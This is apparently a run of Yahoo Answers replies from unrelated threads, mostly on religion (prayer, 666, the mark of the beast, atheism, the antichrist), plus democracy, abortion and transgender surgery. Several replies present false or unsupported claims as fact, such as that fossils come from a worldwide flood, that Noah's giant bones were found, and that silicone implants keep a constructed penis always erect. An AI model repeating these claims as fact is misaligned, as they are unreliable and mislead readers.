struggling.|`|2NtjYREkaa	Don't dare test god, you might not have fear for him but even as you write this he knew you were writing it.    Remember God also gave us doctors to because there humans and God created humans in the likeness of God. God gave everybody a destiny before they were created in the womb so if that was there destiny then good that they accomplished it.     Yes, god does supernatural miracles for people but that's after the fact that doctors can't do squat for you. For example aids..try looking it up to see how many people got healed from it through God because Doctors couldn't do nothing for them.     I suggest you read your bible because I have a sense that you believe in God but are doubting because not so many unbelievers would know what your questioning up there. Having faith in Him can do the impossible!! Remember That!|`|qLvhoRpsaa	I believe in prayer and I also believe in modern medicine and doctors. I would do all. Peace:)|`|5ef81a4a70cec281c1e64cd407d7e84daa	G-d gave men intelligence and free will, I think its fair to say that is we ignore illness and common sense, then prayer is useless too. If my dog got hit by a car common sense says take it to the vet, the dog does not know what to do. If you cut a man into two he will die. Why not let people believe in prayer, it comforts them, gives them hope. Its like crying to a loved one who is passed on. There is a sense of comfort. the real power of prayer is for those who are praying, the human body is going to heal or die. If people think its an answered prayer what is so wrong with that?    Picture a mother whose infant is born but has a high chance of dieing, you have seen it. Praying the child lives, asking G-d why he took her infant if the baby dies, blessing him if her infant lives. Sometimes we can't do anything, some console them self with memories, family, friends, religion, a special ritual.     The only way G-d would be responsible for our health, we are slaves. He must take away our free will so we don't do stupid things that get us hurt. If G-d answered everyone who requested to spare their loved one, we would be over-populated and much worse off. I will keep my free will.    I hope I explained my point of view without any offense to anyone,|`|4807230affa1ab91b912bc7830a4b01baa	I find you have a lot of stipulations when it comes to answering your question. It makes me wonder if you are even looking for an answer.    ...I will answer your question just the same. God is not a vending machine in the sky where you put in the right prayer and pull the handle to get your desires. God gave us common sense and fully expects us to use it. Jesus gave us an example of how to pray. It is called the Lord's prayer. Check it out sometime. There are no specific requests in it but rather an overall request for God to guide and protect us as we live out our lives and make our own choices.|`|f7fcb6877caa0ad4f41dd9af2258ee0aaa	That makes about as much sense as asking "if you believe in the power of prayer, why eat?

wB3AbJyLaa	Out of the Middle East came this nineteenth century world religion that proclaims universal peace and says Christ has been succeeded by a new messenger of God. You know how Christians believe in the Second Coming of Christ? Well, way back Muslims were waiting for the Bab to return. And in 1844, a guy in Iran announced that he was it. His name was Ali-Muhammed, but he took the title of the Bab, which means door in Arabic. He said that another Messenger would come after him and be even greater. Well, thousands of people brought it and followed him, but the government didn't like his gig. Six years later they had him executed. So, after the Bab died, this other guy, Bahaullah, said he was that next Messenger that the Bab had talked about. But he wasn't really too popular either, and they sent him into exile in the Holy Land. He wrote a lot while he was there. Baha'i used his book which are now scripture. After he died, his son and grandson became leaders of the faith. Baha'i believed god is breaking down barriers between races, classes, religions, and nations. Followers of Baha'i work hard to get rid of prejudices because they want all people to be treated as part of a big global family. Bahaullah wrote, "the earth is but one country, and mankind its citizens." Kinda makes your heart warm, doesn't it?|`|a63qA8wzaa	it is satanic|`|AA10259854	Mr. McKenzie gave a good synopsis of Baha'i history condensed into one paragraph (except that the Christians were also expecting Christ to return in 1844), but didn't quite answer the question,  I think.    Baha'i pioneers are people who move to another place (city, country) for th purpose of telling people about Baha'u'llah.  They move there, live there, work there, become part of the community there.

lbt89sEgaa	You should talk to someone you trust, and if there isn't anybody you can trust that much, ask your doctor to refer you to a therapist. I'm truly not trying to say there's anything wrong with you, I'm sure there isn't, but you're going to need to start communicating with someone who can guide your thoughts and feelings to some kind of decision. Bottling this kind of thing will not help you in any way.    Have a look online for some forums in which you can meet like-minded people. Perhaps the student room will have something?

xLQTytYwaa	Allah order people to take with reasons and ask him for success.    Imam Ali, the cousin of the prophet said "Allah raise the position of the nation which apply justice even it was unbeliever, and Allah decrees the position of the nation that apply injustice even if the people of it are believer".    There were times for Muslims Like AlAndalus in which it was the best country in the world at that time and Christian nation used to live darkness. At that time, students used to come from whole Europe to study in AlAndalus. Muslims, Christians and Jews lived in peace amoing each other.    But what happened when European started to develop, they massacred millions of people in AlAndalus, Africa and the world and ruled the the rest of the world like hell.  Now US is the main reason of misery of the world and especially middle east.    But I think your (US) time is coming to expiry. You are no longer will be the super power. Our nation is waking up gradually and things will change.     Believing in God is not enough for success, God also ordered people to take with reasons in order to success.|`|wnkoTEqVaa	Stop trying to convert people.

The context has more to do with a particular issue being addressed in the "pew" than license in the "pulpit".   Considering context is one of the first rules in reading the Bible.    As far as women preaching, there is a great deal of Biblical evidence for women preaching and even pastoring. The first preacher of the resurrection of Jesus Christ was a woman!  The one who brings "word" qualifies as a preacher!!|`|R5UIMBvcaa	Remember that Paul's letters were addressed to specific groups or individuals and dealt with specific matters relevant to those people.  It's my understanding that the women in that particular congregation at that particular time were chattering too much, and Paul wanted to put a stop to it.    As for "ask[ing] their husbands at home," well, no doubt you know many couples who attend church together--but of the married people who come alone (or with the children), how many men do you know who come without their wives, compared to the number of women who come without their husbands?  (And the man I knew best who usually attended church without his wife usually slept through most of it.)    Anothe rconsidereation is that Paul's teachings often conflict with those of Jesus, and in this case, Jesus gave women a pretty prominent place in his circle, even if they weren't among the Twelve.

LJlaHLQdaa	REVELATION  13:18  Here is wisdom. Let him that hath understanding count the number of the beast: for it is the number of a man; and his number is Six hundred threescore and six.     "A refusal to obey the commandments of God, and a determination to cherish hatred against those who proclaim these commandments, leads to the most determined war on the part of the dragon, whose whole energies are brought to bear against the commandment-keeping people of God. 'He causeth all, both small and great, . . . to receive a mark in their right hand, or in their foreheads.'" Not only are men not to work with their hands on Sunday, but with their minds are they to acknowledge Sunday as the Sabbath. "And that no man might buy or sell, save he that had the mark, or the name of the beast, or the number of his name."|`|a5JesB5Paa	This number, 666, reveals the identity of the false prophet who controls the beast power.

I just heard that Roman emperor's name has values which adds up to total of 616 or 666 when you transform it to Hebrew letters. Nowadays, the number became a symbol of the Antichrist or alternately, the devil.    Some interesting fact: People that has fear of the number 666 has this thing called Hexakosioihexekontahexaphobia.

Is that just one man, or because we need wisdom, does it mean the number would reflect man's current condition?      Genesis *:21 And the LORD smelled a sweet savour; and the LORD said in his heart, I will not again curse the ground any more for man's sake; for the imagination of man's heart [is] evil from his youth; neither will I again smite any more every thing living, as I have done.    Since Adam's sin, man has been imperfect, and nothing any human can do to change that. So how does that relate to the number?    Footnote on Revelation 13:18  Six hundred and sixty-six,? A; P47 and Minuscule ms 046, ?, the Gr. letters representing the number 666. Here the number 6 is emphasized to a third degree, namely, 6 plus 60 plus 600.    The number 7 represents perfection, so 6, which is short of 7, does not meet the mark of perfection. Add that MAN is imperfect too, and 6 would be as defective as man's current standing with God.     6 to the third degree, a complete emphasize on imperfection, would indicate that the wild beast is first of all, a man made creation, supported by the dragon or Satan the Devil, is imperfect and doomed to failure.    A name identifies a person. So how does this number identify the beast? John says that it is a mans number, not that of a spirit person, so the name helps to confirm that the wild beast is earthly, symbolizing human government. Just as six fails to measure up to seven, so 666six to the third degreeis a fitting name for the worlds gigantic political system that fails so miserably to measure up to Gods standard of perfection. The worlds political wild beast rules supreme under the name-number 666, while big politics, big religion, and big business keep that wild beast functioning as an oppressor of mankind and a persecutor of Gods people.|`|AA11595906	One more than 665|`|nJatWOhsaa	I think it's a large number.

There's good, then good good is better, and good good good is best. In psalms when it reads "Holy Holy Holy" it meanst "Holiest"    I think it's a similar way with 666.  6 is the number of man.  Man was created on the 6th day. 6 is one short of 7 which is the number of perfect. So, 6 is the number of imperfection, human imperfection and sinfulness to be specific.  So 666 is imperfect imperfect imperfect, or, the most imperfect.|`|c85faeebb94f70edb6993c9354121ea7aa	This is the number of a man....also known as the mark of the beast and the number of his name.

s40sgQ45aa	Let the bible interpret itself.    To understand the mark of the Beast one has to understand what the Seal of God is.     About the mark of the beast.  Notice they receive a mark in their right hand, or in their foreheads.        Rev 13:16  And he causeth all, both small and great, rich and poor, free and bond, to receive a mark in their right hand, or in their foreheads:  Rev 13:17   And that no man might buy or sell, save he that had the mark, or the name of the beast, or the number of his name.     Now notice what God says about his Laws.    Deu 6:1  Now these [are] the commandments, the statutes, and the judgments, which the LORD your God commanded to teach you, that ye might do [them] in the land whither ye go to possess it:    Deu 11:1  Therefore thou shalt love the LORD thy God, and keep his charge, and his statutes, and his judgments, and his commandments, alway.    Regarding God's Laws.  A frontlet between your eyes and a sign upon your hand...      Exd 13:9  And it shall be for a sign unto thee upon thine hand, and for a memorial between thine eyes, that the LORD'S law may be in thy mouth: for with a strong hand hath the LORD brought thee out of Egypt.    Exd 13:16   And it shall be for a token upon thine hand, and for frontlets between thine eyes: for by strength of hand the LORD brought us forth out of Egypt.    Deu 6:8 And thou shalt bind them for a sign upon thine hand, and they shall be as frontlets between thine eyes.    Deu 11:18 Therefore shall ye lay up these my words in your heart and in your soul, and bind them for a sign upon your hand, that they may be as frontlets between your eyes.     God says 'I will put my laws into their mind, and write them in their hearts'    Hbr 8:10  For this [is] the covenant that I will make with the house of Israel after those days, saith the Lord; I will put my laws into their mind, and write them in their hearts: and I will be to them a God, and they shall be to me a people:    10:16 This [is] the covenant that I will make with them after those days, saith the Lord, I will put my laws into their hearts, and in their minds will I write them;    Concerning the 4th commandment.  The Sabbath Law.  We are not to buy or sell on the sabbath or on the holy day or do no work therein.    Neh 10:31   And [if] the people of the land bring ware or any victuals on the sabbath day to sell, [that] we would not buy it of them on the sabbath, or on the holy day: and [that] we would leave the seventh year, and the exaction of every debt.    Lev 23:3  Six days shall work be done: but the seventh day [is] the sabbath of rest, an holy convocation; ye shall do no work [therein]: it [is] the sabbath of the LORD in all your dwellings.    God warns us about one who will speak great words against the most High and will think to change times and laws.      Dan 7:23  Thus he said, The fourth beast shall be the fourth kingdom upon earth, which shall be diverse from all kingdoms, and shall devour the whole earth, and shall tread it down, and break it in pieces.    Dan 7:24 And the ten horns out of this kingdom [are] ten kings [that] shall arise: and another shall rise after them; and he shall be diverse from the first, and he shall subdue three kings.    Dan 7:25 And he shall speak [great] words against the most High, and shall wear out the saints of the most High, and think to change times and laws: and they shall be given into his hand until a time and times and the dividing of time.    Compare Revelations...    Rev 17:16  And the ten horns which thou sawest upon the beast, these shall hate the whore, and shall make her desolate and naked, and shall eat her flesh, and burn her with fire.    Rev 17:17 For God hath put in their hearts to fulfil his will, and to agree, and give their kingdom unto the beast, until the words of God shall be fulfilled.    Rev 17:18 And the woman which thou sawest is that great city, which reigneth over the kings of the earth.    The 4th commandment is the only commandment uses the word 'Remember'.

I love how people on Yahoo answers actually don't take questions seriously at times.    This is one of those times.    This question is an age old one; there is a lot of speculation about it, anything from bar-codes to micro-chipping; even branding.    My personal belief is that there will come a time when we will be made to choose between some sort of device (such as a microchip) or I.D. Card of some sort.  The choice then, will be - once you get that, you have surrendered your soul permanently to Satan.    It is better to refuse the mark and die for Christ, than to receive it and die for eternity.    Might I suggest you check out www.worldslastchance.com - they do have some very interesting information there.  There are plenty of websites out there that are full on into conspiracy theories - but I feel WLC is more about salvation.  There are a few people there that are a bit "over the top" on conspiracy theories - however I choose to concentrate on salvation.    To answer your question, however, if you receive the 'mark', whatever it is - you will not live in the Heavenly Kingdom when God chooses the day and the hour of the end.|`|MRL4BLHhaa	Thoughts of evil or greed.|`|j1vjNjDiaa	To dishonor the Sabbath that is the sign/mark, not observing the 7th  day, calling the 1st day the sabbath.

Why are men not interested to know what constitutes the mark of the beast? Ex. 31:12-17. The Sabbath question will be the issue in the great conflict in which all the world will act a part. Rev. 13: 4-17.    "Christ died to save sinners, not in their sins, but from their sins. The warning given in Revelation shows us the terrible consequence of transgression. By lips that will not lie, God's law is declared to be holy, just, and good. Our duty to obey this law is to be the burden of the last message of mercy to the world. God's law is not a new thing. It is not holiness created, but holiness made known. It is a code of principles expressing mercy, goodness, and love. It presents to fallen humanity the character of God, and states plainly the whole duty of man.    "These principles are made known by the third angel's message, which declares that the Creator has always required and always will require obedience to his royal law. But this law has been disregarded and transgressed, and is now being ignored by the churches. Human enactments are placed where God's law should be. Sunday, a child of the Papacy, has taken the place of God's holy Sabbath. As Nebuchadnezzar made a golden image, and set it up to be worshiped by all, so Sunday is placed before the people to be regarded as sacred.

Now, let me explain:  I feel like the further we move into the future, the more people rely on cards instead of cash or checks.  I believe that we will eventually put everything we have that identifies us on one card/microchip (if they ever get that far).  This card will have our photo on it, and a finger print.  We will scan it when we need to buy something, and it will give all of our information to whoever might need it (medical for doctors, background for job interviews, sex, age, the whole thing).  Nobody will be able to steal one and use it because your finger print has to match (you will also be required to scan your finger whenever you use the card).  It would make a One-World Currency because you wouldn't need to carry cash around with you anymore.  All you would have to do is go to another country (your passport is on it as well) and scan your card, and bam!  It translates the money your spending into whatever money the country you're in takes.  It's an advancement in technology that would stop illegal immigration (they wouldn't be able to buy or sell anything, especially if cash was taken out of the picture), and help find criminals (they wouldn't be able to buy or sell anything without the cops knowing exactly where they were).  It's perfect, and if you don't have it, then society doesn't know you exist, and you can't live (no food, no health care, no nothing).  I know this idea sounds like a good thing in so many ways, but Satan wants people to accept it willingly.  If it were something bad, more people would refuse.      And, that's where Satan will have us cornered.  It would be mighty difficult to survive without this "mark", and he wants as many people to surrender as he can possibly get.  It will be extremely difficult for believers to refuse it, but the smart ones will, and that will make all the difference.|`|CjRfJbncaa	The book of Revelation is written in symbolisms.    The Jewish priests were told to wear certain Scriptures on their foreheads, to *symbolize* that they kept Jehovah first in their minds & their actions.  The Scriptures written on them: Ex 13:1-10, 11-16; De 6:4-9; 11:13-21. They were worn on the forehead or the arm.    To have the 'mark of the beast' on the forehead or hand, similarly symbolizes that these people worship the 'wild beast', whose mark it is. The will of the 'wild beast' is behind both their thoughts, & their actions.  They support the 'wild beast', instead of the Almighty God Jehovah.

(Romans 13:1-2) Let every soul be in subjection to the superior authorities, for there is no authority except by God; the existing authorities stand placed in their relative positions by God. 2?Therefore he who opposes the authority has taken a stand against the arrangement of God; those who have taken a stand against it will receive judgment to themselves.    God allows governments to exist to prevent anarchy, but that does not necessarily mean he agrees with what they do.

Seven in the book of Revelation means perfect.  Six is one less than seven and means imperfect and usually refers to mankind.  Six to the third power means evil. Beasts represent governments.  Check out Daniel.   The beast with the 666 is an evil government.  It opposes God's people because God's people do not support worldly governments.  They do not get involved with politics and are politically neutral.  The evil government will try to rid the world of religion.  All religion.  There is one religion that is the true one.  This evil government will require support from all the people in the world.  They will have to  show that they support this government or they will not be able to buy food or live in the world. This could mean a political card or some kind of ID.  The true religion will not go along with this government. The whole world will turn against this religion. When this happens, the Bible says it is like the people are touching God's eyeball.  God will go into a rage and bring destruction on all who support the beast as well as the beast or government itself.  Then God's kingdom in heaven will replace this evil government and bring peace and happiness to all who survie the destruction of evil. Then God will restore the earth to the paradise he planned on it being in the first place.  This is where all those who have died will be resurrected to and they will enjoy eternal happiness. Rev 21:4|`|EepiLrmZaa	it is the rant of an old man being chased by the roman empire. this old man saw jerusalem reduced to ashes. he saw the holy light on the mountain put out. he saw roman soldiers pull families out of their homes and murder them in the street. rome was a ruthless killing machine. the number of the beast is the number of a man. neron claudius caesar augustus germanicus was his name. what an artist we lost in him. says nero. btw. it took rome almost 100 years to decide if the book of revelation should be part of their holy book.....that is revelation as in one revelation. not revelations as in many revelations.
atfKCzmPaa	Noteworthy is Carl Sagan's remark in the following excerpt. It shows the need really for men to worship. This is an innate desire and cannot be denied but only affirmed by what is the object of veneration chosen by any particular person or persons. Be it the philosophy of atheism or any other philosophy dreamed up by men. The reality is everyone worships. It is merely a matter of what according to our own pleasure.  PERPLEXED by the vast array of religions with their confusing dogmas, rituals and practices, and their hostility toward one another, the tendency of many is to shun all religion. Others no longer have faith because of certain personal tragedies that they feel God could have prevented. Still others, on seeing the suffering and injustices among people in the world, decide that there is no use believing in anything. And many others, influenced by evolution, turn to atheism and agnosticism. Do you identify with any of these people and how they feel about religion?  Does Disbelief Satisfy?  Though many today have turned away from religion, does their course of disbelief bring them satisfaction and happiness? Perhaps freeing oneself from the entanglement of the worlds religions does bring a measure of relief. Yet, sooner or later, one comes to realize that man has a spiritual side to him that has to be satisfied. He often wonders: How did we get here? Why are we here? What is the meaning of life? What does the future hold?  That was the experience of one-time agnostic Masao Fujimaki, who said: From my youth on I used to think about life and death. Death seemed to me to be such a tragedy, a waste. It made any goal in life seem futile and empty.  To fill this void, people who reject organized religion or the belief in a Creator often turn with religious passion to some substitute god. Science, politics, philosophy, and even agnosticism and atheism become their fervently held religion.  The popular scientist Carl Sagan, for example, once stated in an interview: If you look into science you will find a sense of intricacy, depth, and exquisite beauty which, I believe, is much more powerful than the offerings of any bureaucratic religion. Then he added: I would not even object to saying that the sense of awe before the grandeur of nature is itself a religious experience.  But do such experiences really satisfy mans spiritual needs? Fujimaki, quoted above, answered: I became quite wrapped up in the study of electricity, feeling that the laws controlling electricity were the only things I could trust. But still something was lacking in my life. I needed to know Gods name and his purpose for me.  Similarly, Alexander Solzhenitsyn, the noted Soviet exile and author who considered himself a Marxist in his younger years, took a dim view of atheism when he said recently in an award-acceptance speech: The entire 20th?century is being sucked into the vortex of atheism and self-destruction. We can only reach with determination for the warm hand of God, which we have so rashly and self-confidently pushed away .?.?. There is nothing else to cling to in the landslide. That surely does not sound as if disbelief or atheism is the answer, does it?|`|2059629ba703ea51b813a449b0cb4431aa	No, but I think you need to look up the word "atheist" in a dictionary if you think it has anything to do with "faith"...|`|21e2df8fa47efbcd44eaee35a303bd20aa	umm... isnt Atheism a lack of faith? so how could they 'preach their faith' ?|`|yu53u5TFaa	Aside the fact that atheism is not a faith, they probably do it less than Christians do, but people find it offensive so it seems worse.|`|uReeIVlDaa	Atheism isn't a faith.

So in contrast to so-called western elites who label Western Democracy as free and fair, I view Western Democracy as autocratic and unfair.|`|Kiv4D2aWaa	Since majorities prefer democracies to dictatorships, it's never 'forcing'.|`|FhXzlnDOaa	It's not force when the people wanted it and millions got the chance to vote for the first time.  How come no one remembers that?|`|UpIjgNV5aa	You by default CAN'T force or impose a democracy!!|`|ToztjpAsaa	Not if the alternative is a totalitarian dictatorship.|`|0yTM98Odaa	Why would anyone rather have a dictatorship than a democracy anyway...|`|0KR4wyoQaa	Depends.    If the majority of the population wants democracy, and only the ruler and some minorities don't want it then it is not.    If the majority of the population does not want democracy, then it is.|`|Jvsc2lQkaa	A democracy must be developed from within.  The US State department has never cottoned on to the fact that democracy cannot be imposed from external influences.    Throughout history, successful democratic republics have been been homegrown affairs, and republics cannot be born without a considerable amount of bloodshed.  The two most successful democracies in the west, England and the USA, both were born from bloody revolution and civil war.  This pattern repeated -not always successfully - in Ireland, France, Spain and Vietnam.    Republics require a relatively well educated populace, which has a cultural propensity for justice and fair play.  Corruption is the natural enemy of a fledgling democracy, and was the instrument of failure or the limiting factor in such places as the Philippines, Nationalist China and Mexico.       The only time democracy has successfully been imposed in history was in the occupation of Japan.  This would not have been possible without the brilliant cultural balancing act on the part of Douglas Macarthur.      The best that America can hope for is the removal of obstacles to the process of democracy.  An honest evaluation should be made: can a democratic form of government even survive in the suspect country?  The cultures of Iraq makes it a borderline state for this. Are the people equipped with the knowlege necessary to understand the rights and responsibilities of a citizen in a democracy?  Had the answers to these questions been yes for Iraq (and I'm not saying they were), then US policy should have been to topple saddam, and then step back and let nature take it's course.  This would have meant a humanitarian disaster, as the birth of democracy ALWAYS involves copious bloodshed.  The US must acknowlege this and stand aside and let it happen.      Democracies don't just happen, they have to be earned.  There is only one coin that can buy and maintain freedom and liberty, and that is the blood of patriots.  If Iraqi patriots do not pay this price, then the Iraqi democracy has been purchased with counterfeit coin, and is doomed.

AA11104965	This type of question makes abortion rights advocates look like ignorant children who have yet to learn anything about sex or biology.    There is far more difference between a sperm and a zygote than there is between a human fetus and a prematurely born infant.    Surely it would make more sense to base the rights of an organism on its biology than to simply fixate on its location.|`|ObLMLZ74aa	Damn, you beat me to this question!|`|2Hot9EJiaa	You totally have to be kidding me. SPERM does not become life until it fertilizes with the woman's egg-    anyone who knows science at all knows that.  YES abortion is murder, there was a child conceived, not a possibility of conception.|`|NCRfZRopaa	And miscarriages are manslaughter. The whole thinking of abortion is murder is ridiculous.     I don't care how many thumbs-down I get. But it does remind me of one thing...    "Every sperm is sacred.  Every sperm is great.  If a sperm is wasted,  God gets quite irate."|`|LVe6MJfMaa	not for girls. but on another note. abortion is killing an already formed fetus. sperm..i guess you can consider is alive but without an egg it is merely just a cell. your not killing millions of fully functional people.|`|f7fcb6877caa0ad4f41dd9af2258ee0aaa	Masturbation involves no-one's cells but your own.  Abortion kills another human being.

Sperm without the egg creates nothing.

What would be murder is taking the morning after pill (so too bad, rape victims need to birth their rapist's baby).|`|21e2df8fa47efbcd44eaee35a303bd20aa	haha... i never thought of that. though... im pro choice.        ooooo... would it also make abstinance murder? since the egg dies if it isnt fertilised?|`|vzPweG8waa	Genocide is the systematic extermination of a group of people based on their race.    It's only genocide if you're narcissistic enough to consider your own personal gene pool to qualify as a race in of itself.
oL6FUbshaa	Fossilization is caused by flooding. Dinosaur remains worldwide are assoicated with water-laid sediment.    Kind of sounds like a worldwide flood doesn't it?    People in Turkey (Mt. Ararat, where the Ark rested is in Turkey) claim that they have found the bones of Noah. They say the skeleton was 12 feet long.  The Bible says that Giants were alive in those days, and also afterward. Well, if everyone died except for Noah and his family, then how could there be giants in the land after the flood unless Noah and his sons were giants themselves?    So no, God did not kill off the giants. 1 Samuel tells us that David finished off the giants, starting with Goliath.|`|NCRfZRopaa	Funny, I don't see a Biblical explanation for the shocked quartz in the K-T boundary.    There are no mention of dinosaurs in the Bible, but I'm sure some of you will mention the Behemoth.|`|W0Ovbpq0aa	No it doesn't.   I'm sure you are aware that the word dinosaur wasn't created until 1800's. This makes it a little difficult to include in the Bible but I'm sure your keen insight didn't miss that little fact.     Also, I'm sure you know there's a giant that plays for the Houston Rockets.|`|AA10696542	Dinosaurs were put here to test our faith.|`|biPAZ2TVaa	Big and rare animals vanish easier.|`|jW8Fm0eKaa	god didnt kill off the dinosoars...    really... your really asking this?|`|EBGdlo35aa	1) Does the Bible say why God killed all the dinosaurs?    Not only does it not say why, it does not even say that he did.  Why do you believe that he did?      2) Didn't He kill off the giants too?    No - we still have giants.  http://en.wikipedia.org/wiki/List_of_tal...  The tallest of those is only 7 inches shorter than Goliath.    Jim, http://www.bible-reviews. com|`|yu53u5TFaa	It sure doesn't. That's because when the mythologies in the Bible were written no one knew what dinosaurs were yet because they had not yet been discovered.|`|tC1hF1y5aa	Dinosaurs (some of the remnants of which remain today) were probably killed off by a cataclysmic event that caused rapid cooling of the earth's atmosphere.  The mammoth frozen in the tundra with plant matter still in it's mouth is one indicator of that.  But, as for giants,  have you watched a college or professional basketball game lately - they seem pretty gigantic to me.
iVv6bFW2aa	Anti atheists are totalitarian fascists just like the neo and theo cons.|`|qnaGMFAGaa	I don't think so...No body hates you. We  love you.:)|`|I6dcRgD6aa	No, I am not seeing that. I attend a spiritual center where we have all religions & non-religions come together & enjoy all we have in common which is that we are all people in bodies living on the earth. We all have loved who die or transition. Oh, we just have so much more than religion or non-religion. I say that this hate from non-atheist are not important because I don't any energy into them. I think more likely people who will become hated are people like republicans Sarah Palin & CEO's who are taking advantage of people. We don't know who the greedy are but Palin is a representative of them even though she says confusing things all the time. People who vote for her vote for greedy people. This is what I am seeing as the next minority to be hated. They are bringing this on themselves though cause most people don't want to hate them but they are ridiculous.|`|rGEZup0Zaa	The "next"?

He respects "non-believers" as he puts it... and has included that group with other religious groups when mentioning religion in the US.    If we had continued Bush's spree by voting Palin into office... who's to say!|`|AA10736285	What about abortion?|`|SzqCD0G0aa	Next?    If the attitudes and complete hatred of atheists by some on this site is ANY indication of what is happening in the US, I would say that it's been there for a while.     Vile  Evil  Murderers  Rapists  Pedophiles  Alcoholics  Immoral  Animals  Illiterate  Retards    All of the above have been used by varying people since I have been on this site, and considering I am not from the US, seeing this spoken by americans TO americans, was shocking to say the least.    Do I think it's the next big hate in the US, Nope. For people to form obvious hatefilled opinions of every person that doesn't believe as they do, some wishing death etc on others, I would say this has been around for a long time.  Opinions such as this is learned, one isn't born to hate or love, one is taught.|`|604963ef82ec90b5bd0becdfe005c25eaa	The only thing that should not be tolerated is intolerance.  Let people be who they are as long as they don't hurt others.
IwXuWX05aa	I couldn't listen to the whole song; it's horrible plus the dance reminds me of your cousin eddie, if you have one.  Well, yes I feel like your god is never there cause your god never was or will be there.  We are all gods and goddesses, part of the greater oneness.  Btw, I'm spiritual but not christian...not anymore.|`|KQGF9UEraa	Yup, all the time.|`|355JLlcLaa	I'm closer to knowing it rather than feeling it.    I realised in mid-teenage that faith was based upon nothing but itself, that science explained nature satisfactorily without needing supernatural beings, and that religious beliefs were no different to those of ancient beliefs in gods and goddesses.     Belief in a god probably goes back to times when people didn't understand how the seasons worked. And when winter came and the crops no longer grew, some sort of sacrifice would have been made to the sun, and then it came back and the crops grew. The people would have associated the sacrifice with the positive outcome, and they wouldn't have dared not do it again because they couldn't risk famine.    In time the sacrifice will have become more sophisticated, and perhaps the idea came about that the sun might be the gift of a god rather than the god itself. This might be a way, or similar to a way, that religion developed.     People would then have assumed that the laws that their ancestors devised came from the god, so the religion would have become even more sophisticated still, providing authority for the laws and fear of a vengeful god if laws were disobeyed, and the same fear would make others stone to death anyone who breached a law to avoid vengeance being visited on the whole community.     There are probably other elements, but it will have gone back to the dawn of civilisation.    The idea of the biblical God changes throughout the course of the Bible as does the name, and there seem to be several changes of Deity. For example, when Moses encounters God, God introduces himself as Yahweh (I am who am, I will be what I will be, etc), which is a different name to that used at the beginning of Genesis, Elohim, a plural of El a Canaanite (Phoenician) deity; continuity with previous beliefs is maintained by claiming to be the God of Abraham, Jacob (Israel) and Isaac. In fact the first Creation myth in Genesis probably derives from the Babylonian Creation Epic, Enuma Elish in which the Creator God's name is Marduk, probably via the Canaanites|`|I0aosHnuaa	Yes, all the time ... there is NO god ... our parents made us.|`|lFoHhPXLaa	sometimes|`|4fc129ccfffdb16cb2d28a6fe0c55cdeaa	No...He's definetly out there, because we can all see his sick sense of humor. >:)|`|31e0283ff8bc957ec9168709f61d5bf0aa	How about thinking that you were at times lost in the sight of God? Not that He does not see you but you seem to hide yourself away.  In times that you were looking for Him don't you think that you may have turned your eyes away from the truth that He is always within you?|`|biPAZ2TVaa	Nope.
IwXuWX05aa	Since I made up my own religion, who can criticize it.  It is also subject to change at my whim.  LOL.  But yes, I look at other religions, and think, "How Bizarre!"  http://www.youtube.com/watch?v=TfJe8hQ8h...  For example, there's the creepy cryptkeeper christian right now thumbing down cause he/she/it doesn't agree with me or doesn't like the song.|`|pzLDXL6gaa	I don't have religion and all these imaginary beliefs seem to be pretty stupid    Harriet|`|uiTkwGBNaa	yes, but that would make them mad.|`|4rWPX8CTaa	No, because I have no beliefs.

Maybe those praying thought they were communing with God, whereas what they were doing was preparing themselves for the emotional shock of whatever was about to be revealed.
XEBpv9gwaa	Interesting question.  I am an American Christian and I too shake my head at how some of us act.  There is a lot of self centeredness here - meaning that many think America is the center of the world or the only place in the world.  I see it with climate change too.  It's really cold in the northern American states this winter and many take that to mean that global warming couldn't possibly really exist.  As if there is no where else in the world experiencing anything different.    It's ignorance, mostly.  I think it reflects badly on us as a country when some give those kinds of impressions to others around the world.|`|WfR6AqHiaa	people only think obama is the antichrist is becuase he is uniting the world. has america thought every one of our presidents was the antichrist?|`|2T49GGLKaa	i'm an american christian, and i don't think that obama is the anti-christ. i don't know any other christians that do, either. and how is that arrogant? people should be able to belive what they want to.|`|B8cHdPBAaa	I don't think that American leaders are the Anti-Christ ...

It appears that you are just trying to support Obama since he is the only American Leader that I have heard this about in any significant way.  Saddam Hussein, Stalin, Lenin and Adolf Hitler were all suggested at one point or another to be the Anti-Christ and neither one of them is American.

I seriously doubt Obama is the anti-Christ.  The anti-Christ will far more likely be the Islamic version/fake Jesus Christ, who will come and deceive people into believing he is the real Jesus Christ but of course he is not the real Jesus, he will be a fake.  And the false prophet will be the Islamic Al Mahdi.      Jesus warns us of somebody coming in his name in the last days, claiming to be him and deceiving people:  Matthew 24:23- "At that time if anyone says to you, 'Look here is the Christ' or 'there he is', do not believe it.

oVeGMNsLaa	Yes.  There are two types of surgery, metoidioplasty and phalloplasty.  A metoidioplasty cuts a tendon that attaches the testosterone-enlarged clitoris to the pelvis, so that it hangs lower and looks bigger.  Because all clitorises naturally get erect with arousal, the FtM in question can certainly get erect.  But they are much smaller than biological penises.    Phalloplasty surgery occurs when doctors take skin donation (usually from the inner forearm or the thigh) and attach it to the pelvis and shape it as a penis.  There are lots of problems with this (it doesn't look realistic, for example), but it also cannot get erect on its own.  Fortunately, FtM men use the same thing that impotent biological men use- a little device that is implanted in his hip.  He presses his hip, which pushes the internal button and gives him an instant erection (which he can then take away with another push).    It might be a little too graphic for you, but if you look up "FtM" on Xtube, you can see lots of FtM guys sharing their erections!    Hope that helps you!|`|sgRJRuvgaa	From what I know when you get it changed your new penis is made from silicon and you always have an erection.|`|GahpE5U2aa	No. Not yet anyway.

EDIT: the reason why i am not interested in the surgery is because theirs such a high risk that it wont function or even that it will get infected and fall off, that its just not worth the money and the risk personally for myself at the moment, but hopefully in the next 10-20 years it will be improved and i will do it.

Only Jesus is acceptable payment for sins, because Jesus died on the cross as FULL PAYMENT for our sins, and then Jesus rose from the dead.     All the good deeds in the world won't pay for even ONE of your sins. All the trying to be a "good person" won't pay for even ONE of your sins. Doing "religious activites" won't pay for even ONE of your sins.     Either Jesus pays for your sins, or you pay for them in eternal torment in hell. That is the choice before you.    So believe in Jesus as God and Savior without adding any of your own works, and you're saved, that simple (John 3:16). :)|`|jW8Fm0eKaa	if there is one,  ignorance wont get you there either|`|XqS5DxR9aa	That's what the gullable Jesus freaks believe.|`|KC5vBg4uaa	Well I'm assuming you're refering to heaven, and not heave.    It really depends.  According to most religions, atheists will not go to heaven because they don't believe in that religion's god.

